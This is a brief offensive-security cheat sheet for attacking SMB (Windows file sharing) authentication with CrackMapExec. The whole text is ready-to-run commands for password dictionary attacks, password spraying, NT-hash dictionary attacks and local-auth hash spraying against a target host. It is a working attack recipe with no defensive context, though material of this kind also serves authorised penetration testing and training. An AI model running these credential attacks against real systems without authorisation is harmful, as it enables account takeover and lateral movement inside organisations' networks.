# Server Message Block

## Password dictionary attack

_CrackMapExec_

```
crackmapexec smb 127.0.0.1 -u users.txt -p passwords.txt --continue-on-success
```

## Password Spraying

```
cme smb $ip -u users.txt -p 'password'
```

## Hash dictionary attack

```
crackmapexec smb 127.0.0.1 -u users.txt -H NThashes.txt --continue-on-success
```

## Hash spray

```
crackmapexec smb 127.0.0.1 -u users.txt -H :hash --continue-on-success --local-auth
```
